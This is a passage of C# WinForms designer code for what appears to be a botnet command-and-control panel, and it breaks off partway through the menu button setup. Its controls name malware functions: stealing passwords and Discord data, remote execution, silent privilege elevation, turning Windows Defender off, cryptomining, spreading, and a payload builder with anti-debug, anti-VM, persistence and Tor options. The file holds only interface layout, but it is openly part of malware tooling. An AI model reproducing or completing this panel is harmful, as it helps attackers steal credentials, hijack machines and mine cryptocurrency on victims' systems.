namespace Panel
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            System.Windows.Forms.DataVisualization.Charting.ChartArea chartArea1 = new System.Windows.Forms.DataVisualization.Charting.ChartArea();
            System.Windows.Forms.DataVisualization.Charting.Legend legend1 = new System.Windows.Forms.DataVisualization.Charting.Legend();
            System.Windows.Forms.DataVisualization.Charting.Series series1 = new System.Windows.Forms.DataVisualization.Charting.Series();
            System.Windows.Forms.DataVisualization.Charting.Title title1 = new System.Windows.Forms.DataVisualization.Charting.Title();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle1 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
            this.FormRounding = new Bunifu.Framework.UI.BunifuElipse(this.components);
            this.SidePanel = new System.Windows.Forms.FlowLayoutPanel();
            this.Menu1 = new Bunifu.Framework.UI.BunifuFlatButton();
            this.Menu2 = new Bunifu.Framework.UI.BunifuFlatButton();
            this.Menu3 = new Bunifu.Framework.UI.BunifuFlatButton();
            this.Menu4 = new Bunifu.Framework.UI.BunifuFlatButton();
            this.Menu5 = new Bunifu.Framework.UI.BunifuFlatButton();
            this.Menu6 = new Bunifu.Framework.UI.BunifuFlatButton();
            this.Menu7 = new Bunifu.Framework.UI.BunifuFlatButton();
            this.Menu8 = new Bunifu.Framework.UI.BunifuFlatButton();
            this.TopPanel = new System.Windows.Forms.Panel();
            this.MinimizeButton = new Bunifu.Framework.UI.BunifuTileButton();
            this.CloseButton = new Bunifu.Framework.UI.BunifuTileButton();
            this.TitleLabel = new System.Windows.Forms.Label();
            this.PageControl = new System.Windows.Forms.TabControl();
            this.Page1 = new System.Windows.Forms.TabPage();
            this.StatCard2 = new Bunifu.Framework.UI.BunifuCards();
            this.uptimeLabel = new System.Windows.Forms.Label();
            this.miningLabel = new System.Windows.Forms.LinkLabel();
            this.usersLabel = new System.Windows.Forms.Label();
            this.offlineLabel = new System.Windows.Forms.Label();
            this.onlineLabel = new System.Windows.Forms.Label();
            this.botsLabel = new System.Windows.Forms.Label();
            this.StatCard1 = new Bunifu.Framework.UI.BunifuCards();
            this.updateLabel = new System.Windows.Forms.Label();
            this.networkLabel = new System.Windows.Forms.Label();
            this.systemLabel = new System.Windows.Forms.Label();
            this.systemProgressBar = new Bunifu.Framework.UI.BunifuCircleProgressbar();
            this.activityChart = new System.Windows.Forms.DataVisualization.Charting.Chart();
            this.Page2 = new System.Windows.Forms.TabPage();
            this.botGrid = new Bunifu.Framework.UI.BunifuCustomDataGrid();
            this.idCol = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.checkCol = new System.Windows.Forms.DataGridViewCheckBoxColumn();
            this.statusCol = new System.Windows.Forms.DataGridViewImageColumn();
            this.nameCol = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.ipCol = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.compCol = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.sysCol = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.taskMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.doSomethingToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdBotInfo = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdRestart = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdBlock = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdUpdate = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdUninstall = new System.Windows.Forms.ToolStripMenuItem();
            this.withThisBotToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdCompleteInfo = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdSysInfo = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdSoftInfo = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdPassInfo = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdDiscordInfo = new System.Windows.Forms.ToolStripMenuItem();
            this.filesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdDownload = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdUpload = new System.Windows.Forms.ToolStripMenuItem();
            this.listToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdFolderList = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdFileList = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdOpen = new System.Windows.Forms.ToolStripMenuItem();
            this.okToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.powerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdShutdown = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdReboot = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdLock = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdSleep = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdWake = new System.Windows.Forms.ToolStripMenuItem();
            this.executeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdExec = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdRemoteExec = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdCommand = new System.Windows.Forms.ToolStripMenuItem();
            this.miningToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdAskElevate = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdDisguisedElevate = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdSilentElevate = new System.Windows.Forms.ToolStripMenuItem();
            this.windowsDefenderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdDefenderOff = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdDefenderOn = new System.Windows.Forms.ToolStripMenuItem();
            this.miningToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdStartMining = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdQueryMining = new System.Windows.Forms.ToolStripMenuItem();
            this.spreadingToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdStartSpreading = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdDisinfect = new System.Windows.Forms.ToolStripMenuItem();
            this.miscToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdMessageBox = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdAbort = new System.Windows.Forms.ToolStripMenuItem();
            this.Page3 = new System.Windows.Forms.TabPage();
            this.fileView = new System.Windows.Forms.ListView();
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.fileMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.downloadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.DeleteStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.uploadHereToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.Page4 = new System.Windows.Forms.TabPage();
            this.clearButton = new Bunifu.Framework.UI.BunifuFlatButton();
            this.refreshButton = new Bunifu.Framework.UI.BunifuFlatButton();
            this.logBox = new System.Windows.Forms.TextBox();
            this.logDropdown = new Bunifu.Framework.UI.BunifuDropdown();
            this.Page5 = new System.Windows.Forms.TabPage();
            this.secondarySettings = new Bunifu.Framework.UI.BunifuCards();
            this.torCheck = new Bunifu.Framework.UI.BunifuCheckbox();
            this.torLabel = new System.Windows.Forms.Label();
            this.hideCheck = new Bunifu.Framework.UI.BunifuCheckbox();
            this.label9 = new System.Windows.Forms.Label();
            this.vectorLabel = new System.Windows.Forms.Label();
            this.vectorEdit = new Bunifu.Framework.UI.BunifuMetroTextbox();
            this.baseLocDropdown = new Bunifu.Framework.UI.BunifuDropdown();
            this.baseLocLabel = new System.Windows.Forms.Label();
            this.baseNameLabel = new System.Windows.Forms.Label();
            this.baseNameEdit = new Bunifu.Framework.UI.BunifuMetroTextbox();
            this.meltCheck = new Bunifu.Framework.UI.BunifuCheckbox();
            this.meltLabel = new System.Windows.Forms.Label();
            this.elevateCheck = new Bunifu.Framework.UI.BunifuCheckbox();
            this.elevateLabel = new System.Windows.Forms.Label();
            this.windefCheck = new Bunifu.Framework.UI.BunifuCheckbox();
            this.windefLabel = new System.Windows.Forms.Label();
            this.sleepCheck = new Bunifu.Framework.UI.BunifuCheckbox();
            this.sleepLabel = new System.Windows.Forms.Label();
            this.antiDebugCheck = new Bunifu.Framework.UI.BunifuCheckbox();
            this.antiDebugLabel = new System.Windows.Forms.Label();
            this.antiVirtCheck = new Bunifu.Framework.UI.BunifuCheckbox();
            this.antiVirtLabel = new System.Windows.Forms.Label();
            this.reinfectCheck = new Bunifu.Framework.UI.BunifuCheckbox();
            this.reinfectLabel = new System.Windows.Forms.Label();
            this.persistenceCheck = new Bunifu.Framework.UI.BunifuCheckbox();
            this.persistenceLabel = new System.Windows.Forms.Label();
            this.startupCheck = new Bunifu.Framework.UI.BunifuCheckbox();
            this.sep2 = new Bunifu.Framework.UI.BunifuSeparator();
            this.sep1 = new Bunifu.Framework.UI.BunifuSeparator();
            this.folderStRadio = new System.Windows.Forms.RadioButton();
            this.regStRadio = new System.Windows.Forms.RadioButton();
            this.taskStRadio = new System.Windows.Forms.RadioButton();
            this.autoStRadio = new System.Windows.Forms.RadioButton();
            this.startupLabel = new System.Windows.Forms.Label();
            this.buildProgressBar = new Bunifu.Framework.UI.BunifuProgressBar();
            this.mainSettings = new Bunifu.Framework.UI.BunifuCards();
            this.browseButton = new Bunifu.Framework.UI.BunifuFlatButton();
            this.fileNameEdit = new Bunifu.Framework.UI.BunifuMetroTextbox();
            this.innerEdit = new Bunifu.Framework.UI.BunifuMetroTextbox();
            this.iconBox = new System.Windows.Forms.PictureBox();
            this.iconMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.addIconToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.removeIconToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.buildButton = new Bunifu.Framework.UI.BunifuFlatButton();
            this.Page6 = new System.Windows.Forms.TabPage();
            this.progressLabel = new System.Windows.Forms.Label();
            this.scanButton = new Bunifu.Framework.UI.BunifuFlatButton();
            this.resultBox = new System.Windows.Forms.PictureBox();
            this.browseButton2 = new Bunifu.Framework.UI.BunifuFlatButton();
            this.fileNameEdit2 = new Bunifu.Framework.UI.BunifuMetroTextbox();
            this.Page7 = new System.Windows.Forms.TabPage();
            this.torCheck1 = new Bunifu.Framework.UI.BunifuCheckbox();
            this.torLabel1 = new System.Windows.Forms.Label();
            this.TorButton = new Bunifu.Framework.UI.BunifuFlatButton();
            this.RILabel = new System.Windows.Forms.Label();
            this.apiTextBox = new Bunifu.Framework.UI.BunifuMetroTextbox();
            this.resetButton = new Bunifu.Framework.UI.BunifuFlatButton();
            this.apiLabel = new System.Windows.Forms.Label();
            this.RITextBox = new Bunifu.Framework.UI.BunifuMetroTextbox();
            this.prefixLabel = new System.Windows.Forms.Label();
            this.prefixTextBox = new Bunifu.Framework.UI.BunifuMetroTextbox();
            this.saveButton = new Bunifu.Framework.UI.BunifuFlatButton();
            this.miningLabel1 = new System.Windows.Forms.Label();
            this.miningTextBox = new Bunifu.Framework.UI.BunifuMetroTextbox();
            this.intervalSlider = new Bunifu.Framework.UI.BunifuSlider();
            this.intervalLabel = new System.Windows.Forms.Label();
            this.gateLabel = new System.Windows.Forms.Label();
            this.gateTextBox = new Bunifu.Framework.UI.BunifuMetroTextbox();
            this.Page8 = new System.Windows.Forms.TabPage();
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.logoLabel = new System.Windows.Forms.Label();
            this.FileViewRounding = new Bunifu.Framework.UI.BunifuElipse(this.components);
            this.topDrag = new Bunifu.Framework.UI.BunifuDragControl(this.components);
            this.saveAsDialog = new System.Windows.Forms.SaveFileDialog();
            this.openIconDialog = new System.Windows.Forms.OpenFileDialog();
            this.scanDialog = new System.Windows.Forms.OpenFileDialog();
            this.uploadDialog = new System.Windows.Forms.OpenFileDialog();
            this.SidePanel.SuspendLayout();
            this.TopPanel.SuspendLayout();
            this.PageControl.SuspendLayout();
            this.Page1.SuspendLayout();
            this.StatCard2.SuspendLayout();
            this.StatCard1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.activityChart)).BeginInit();
            this.Page2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.botGrid)).BeginInit();
            this.taskMenu.SuspendLayout();
            this.Page3.SuspendLayout();
            this.fileMenu.SuspendLayout();
            this.Page4.SuspendLayout();
            this.Page5.SuspendLayout();
            this.secondarySettings.SuspendLayout();
            this.mainSettings.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.iconBox)).BeginInit();
            this.iconMenu.SuspendLayout();
            this.Page6.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.resultBox)).BeginInit();
            this.Page7.SuspendLayout();
            this.Page8.SuspendLayout();
            this.SuspendLayout();
            // 
            // FormRounding
            // 
            this.FormRounding.ElipseRadius = 5;
            this.FormRounding.TargetControl = this;
            // 
            // SidePanel
            // 
            this.SidePanel.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.SidePanel.Controls.Add(this.Menu1);
            this.SidePanel.Controls.Add(this.Menu2);
            this.SidePanel.Controls.Add(this.Menu3);
            this.SidePanel.Controls.Add(this.Menu4);
            this.SidePanel.Controls.Add(this.Menu5);
            this.SidePanel.Controls.Add(this.Menu6);
            this.SidePanel.Controls.Add(this.Menu7);
            this.SidePanel.Controls.Add(this.Menu8);
            this.SidePanel.Dock = System.Windows.Forms.DockStyle.Left;
            this.SidePanel.Location = new System.Drawing.Point(0, 45);
            this.SidePanel.Name = "SidePanel";
            this.SidePanel.Size = new System.Drawing.Size(182, 452);
            this.SidePanel.TabIndex = 1;
            // 
            // Menu1
            // 
            this.Menu1.Activecolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.Menu1.BackColor = System.Drawing.Color.Transparent;
            this.Menu1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.Menu1.BorderRadius = 0;
            this.Menu1.ButtonText = "   Dashboard";
            this.Menu1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Menu1.DisabledColor = System.Drawing.Color.Gray;
            this.Menu1.Iconcolor = System.Drawing.Color.Transparent;
            this.Menu1.Iconimage = ((System.Drawing.Image)(resources.GetObject("Menu1.Iconimage")));
            this.Menu1.Iconimage_right = null;
            this.Menu1.Iconimage_right_Selected = null;
            this.Menu1.Iconimage_Selected = null;
            this.Menu1.IconMarginLeft = 0;
            this.Menu1.IconMarginRight = 0;
            this.Menu1.IconRightVisible = true;
            this.Menu1.IconRightZoom = 0D;
            this.Menu1.IconVisible = true;
            this.Menu1.IconZoom = 50D;
            this.Menu1.IsTab = false;
            this.Menu1.Location = new System.Drawing.Point(0, 0);
            this.Menu1.Margin = new System.Windows.Forms.Padding(0);
            this.Menu1.Name = "Menu1";
            this.Menu1.Normalcolor = System.Drawing.Color.Transparent;
            this.Menu1.OnHovercolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.Menu1.OnHoverTextColor = System.Drawing.Color.White;
            this.Menu1.selected = true;
            this.Menu1.Size = new System.Drawing.Size(182, 45);
            this.Menu1.TabIndex = 0;
            this.Menu1.Text = "   Dashboard";
            this.Menu1.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.Menu1.Textcolor = System.Drawing.Color.White;
            this.Menu1.TextFont = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Menu1.Click += new System.EventHandler(this.SomeMenu_Click);
            // 
            // Menu2
            // 
            this.Menu2.Activecolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.Menu2.BackColor = System.Drawing.Color.Transparent;
            this.Menu2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.Menu2.BorderRadius = 0;
            this.Menu2.ButtonText = "   Bots";
            this.Menu2.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Menu2.DisabledColor = System.Drawing.Color.Gray;
            this.Menu2.Iconcolor = System.Drawing.Color.Transparent;
            this.Menu2.Iconimage = ((System.Drawing.Image)(resources.GetObject("Menu2.Iconimage")));
            this.Menu2.Iconimage_right = null;
            this.Menu2.Iconimage_right_Selected = null;
            this.Menu2.Iconimage_Selected = null;
            this.Menu2.IconMarginLeft = 0;
            this.Menu2.IconMarginRight = 0;
            this.Menu2.IconRightVisible = true;
            this.Menu2.IconRightZoom = 0D;
            this.Menu2.IconVisible = true;
            this.Menu2.IconZoom = 50D;
            this.Menu2.IsTab = false;
            this.Menu2.Location = new System.Drawing.Point(0, 45);
            this.Menu2.Margin = new System.Windows.Forms.Padding(0);
            this.Menu2.Name = "Menu2";
            this.Menu2.Normalcolor = System.Drawing.Color.Transparent;
            this.Menu2.OnHovercolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.Menu2.OnHoverTextColor = System.Drawing.Color.White;
            this.Menu2.selected = false;
            this.Menu2.Size = new System.Drawing.Size(182, 45);
            this.Menu2.TabIndex = 1;
            this.Menu2.Text = "   Bots";
            this.Menu2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.Menu2.Textcolor = System.Drawing.Color.White;
            this.Menu2.TextFont = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Menu2.Click += new System.EventHandler(this.SomeMenu_Click);
            // 
            // Menu3
            // 
            this.Menu3.Activecolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.Menu3.BackColor = System.Drawing.Color.Transparent;
            this.Menu3.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.Menu3.BorderRadius = 0;
            this.Menu3.ButtonText = "   Files";
            this.Menu3.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Menu3.DisabledColor = System.Drawing.Color.Gray;
            this.Menu3.Iconcolor = System.Drawing.Color.Transparent;
            this.Menu3.Iconimage = ((System.Drawing.Image)(resources.GetObject("Menu3.Iconimage")));
            this.Menu3.Iconimage_right = null;
            this.Menu3.Iconimage_right_Selected = null;
            this.Menu3.Iconimage_Selected = null;
            this.Menu3.IconMarginLeft = 0;
            this.Menu3.IconMarginRight = 0;
            this.Menu3.IconRightVisible = true;
            this.Menu3.IconRightZoom = 0D;
            this.Menu3.IconVisible = true;
            this.Menu3.IconZoom = 50D;
            this.Menu3.IsTab = false;
            this.Menu3.Location = new System.Drawing.Point(0, 90);
            this.Menu3.Margin = new System.Windows.Forms.Padding(0);
            this.Menu3.Name = "Menu3";
            this.Menu3.Normalcolor = System.Drawing.Color.Transparent;
            this.Menu3.OnHovercolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.Menu3.OnHoverTextColor = System.Drawing.Color.White;
            this.Menu3.selected = false;
            this.Menu3.Size = new System.Drawing.Size(182, 45);
            this.Menu3.TabIndex = 2;
            this.Menu3.Text = "   Files";
            this.Menu3.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.Menu3.Textcolor = System.Drawing.Color.White;
            this.Menu3.TextFont = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Menu3.Click += new System.EventHandler(this.SomeMenu_Click);
            // 
            // Menu4
            // 
            this.Menu4.Activecolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.Menu4.BackColor = System.Drawing.Color.Transparent;
            this.Menu4.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.Menu4.BorderRadius = 0;
            this.Menu4.ButtonText = "   Logs";
            this.Menu4.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Menu4.DisabledColor = System.Drawing.Color.Gray;
            this.Menu4.Iconcolor = System.Drawing.Color.Transparent;
            this.Menu4.Iconimage = ((System.Drawing.Image)(resources.GetObject("Menu4.Iconimage")));
            this.Menu4.Iconimage_right = null;
            this.Menu4.Iconimage_right_Selected = null;
            this.Menu4.Iconimage_Selected = null;
            this.Menu4.IconMarginLeft = 0;
            this.Menu4.IconMarginRight = 0;
            this.Menu4.IconRightVisible = true;
            this.Menu4.IconRightZoom = 0D;
            this.Menu4.IconVisible = true;
            this.Menu4.IconZoom = 50D;
            this.Menu4.IsTab = false;
            this.Menu4.Location = new System.Drawing.Point(0, 135);
            this.Menu4.Margin = new System.Windows.Forms.Padding(0);
            this.Menu4.Name = "Menu4";
            this.Menu4.Normalcolor = System.Drawing.Color.Transparent;
            this.Menu4.OnHovercolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.Menu4.OnHoverTextColor = System.Drawing.Color.White;
            this.Menu4.selected = false;
            this.Menu4.Size = new System.Drawing.Size(182, 45);
            this.Menu4.TabIndex = 3;
            this.Menu4.Text = "   Logs";
            this.Menu4.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.Menu4.Textcolor = System.Drawing.Color.White;
            this.Menu4.TextFont = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Menu4.Click += new System.EventHandler(this.SomeMenu_Click);
            // 
            // Menu5
            // 
            this.Menu5.Activecolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.Menu5.BackColor = System.Drawing.Color.Transparent;
            this.Menu5.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.Menu5.BorderRadius = 0;
            this.Menu5.ButtonText = "   Builder";
            this.Menu5.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Menu5.DisabledColor = System.Drawing.Color.Gray;
            this.Menu5.Iconcolor = System.Drawing.Color.Transparent;
            this.Menu5.Iconimage = ((System.Drawing.Image)(resources.GetObject("Menu5.Iconimage")));
            this.Menu5.Iconimage_right = null;
            this.Menu5.Iconimage_right_Selected = null;
            this.Menu5.Iconimage_Selected = null;
            this.Menu5.IconMarginLeft = 0;
            this.Menu5.IconMarginRight = 0;
            this.Menu5.IconRightVisible = true;
            this.Menu5.IconRightZoom = 0D;
            this.Menu5.IconVisible = true;
            this.Menu5.IconZoom = 50D;
            this.Menu5.IsTab = false;
            this.Menu5.Location = new System.Drawing.Point(0, 180);
            this.Menu5.Margin = new System.Windows.Forms.Padding(0);
            this.Menu5.Name = "Menu5";
            this.Menu5.Normalcolor = System.Drawing.Color.Transparent;
            this.Menu5.OnHovercolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.Menu5.OnHoverTextColor = System.Drawing.Color.White;
            this.Menu5.selected = false;
            this.Menu5.Size = new System.Drawing.Size(182, 45);
            this.Menu5.TabIndex = 4;
            this.Menu5.Text = "   Builder";
            this.Menu5.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.Menu5.Textcolor = System.Drawing.Color.White;
            this.Menu5.TextFont = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Menu5.Click += new System.EventHandler(this.SomeMenu_Click);
            // 
            // Menu6
            // 
            this.Menu6.Activecolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.Menu6.BackColor = System.Drawing.Color.Transparent;
            this.Menu6.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.Menu6.BorderRadius = 0;
            this.Menu6.ButtonText = "   Scanner";
            this.Menu6.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Menu6.DisabledColor = System.Drawing.Color.Gray;
            this.Menu6.Iconcolor = System.Drawing.Color.Transparent;
            this.Menu6.Iconimage = ((System.Drawing.Image)(resources.GetObject("Menu6.Iconimage")));
            this.Menu6.Iconimage_right = null;
            this.Menu6.Iconimage_right_Selected = null;
            this.Menu6.Iconimage_Selected = null;
            this.Menu6.IconMarginLeft = 0;
            this.Menu6.IconMarginRight = 0;
            this.Menu6.IconRightVisible = true;
            this.Menu6.IconRightZoom = 0D;
            this.Menu6.IconVisible = true;
            this.Menu6.IconZoom = 50D;
            this.Menu6.IsTab = false;
            this.Menu6.Location = new System.Drawing.Point(0, 225);
            this.Menu6.Margin = new System.Windows.Forms.Padding(0);
            this.Menu6.Name = "Menu6";
            this.Menu6.Normalcolor = System.Drawing.Color.Transparent;
            this.Menu6.OnHovercolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.Menu6.OnHoverTextColor = System.Drawing.Color.White;
            this.Menu6.selected = false;
            this.Menu6.Size = new System.Drawing.Size(182, 45);
            this.Menu6.TabIndex = 5;
            this.Menu6.Text = "   Scanner";
            this.Menu6.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.Menu6.Textcolor = System.Drawing.Color.White;
            this.Menu6.TextFont = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Menu6.Click += new System.EventHandler(this.SomeMenu_Click);
            // 
            // Menu7
            // 
            this.Menu7.Activecolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.Menu7.BackColor = System.Drawing.Color.Transparent;
            this.Menu7.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.Menu7.BorderRadius = 0;
            this.Menu7.ButtonText = "   Configuration";
            this.Menu7.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Menu7.DisabledColor = System.Drawing.Color.Gray;
            this.Menu7.Iconcolor = System.Drawing.Color.Transparent;
            this.Menu7.Iconimage = ((System.Drawing.Image)(resources.GetObject("Menu7.Iconimage")));
            this.Menu7.Iconimage_right = null;
            this.Menu7.Iconimage_right_Selected = null;
            this.Menu7.Iconimage_Selected = null;
            this.Menu7.IconMarginLeft = 0;
            this.Menu7.IconMarginRight = 0;
            this.Menu7.IconRightVisible = true;
            this.Menu7.IconRightZoom = 0D;
            this.Menu7.IconVisible = true;
            this.Menu7.IconZoom = 50D;
            this.Menu7.IsTab = false;
            this.Menu7.Location = new System.Drawing.Point(0, 270);
            this.Menu7.Margin = new System.Windows.Forms.Padding(0);
            this.Menu7.Name = "Menu7";
            this.Menu7.Normalcolor = System.Drawing.Color.Transparent;
            this.Menu7.OnHovercolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.Menu7.OnHoverTextColor = System.Drawing.Color.White;
            this.Menu7.selected = false;
            this.Menu7.Size = new System.Drawing.Size(182, 45);
            this.Menu7.TabIndex = 6;
            this.Menu7.Text = "   Configuration";
            this.Menu7.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.Menu7.Textcolor = System.Drawing.Color.White;
            this.Menu7.TextFont = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Menu7.Click += new System.EventHandler(this.SomeMenu_Click);
            // 
            // Menu8
            // 
            this.Menu8.Activecolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.Menu8.BackColor = System.Drawing.Color.Transparent;
            this.Menu8.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.Menu8.BorderRadius = 0;
            this.Menu8.ButtonText = "   About";
            this.Menu8.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Menu8.DisabledColor = System.Drawing.Color.Gray;
            this.Menu8.Iconcolor = System.Drawing.Color.Transparent;
            this.Menu8.Iconimage = ((System.Drawing.Image)(resources.GetObject("Menu8.Iconimage")));
            this.Menu8.Iconimage_right = null;
            this.Menu8.Iconimage_right_Selected = null;
            this.Menu8.Iconimage_Selected = null;
            this.Menu8.IconMarginLeft = 0;
            this.Menu8.IconMarginRight = 0;
            this.Menu8.IconRightVisible = true;
            this.Menu8.IconRightZoom = 0D;
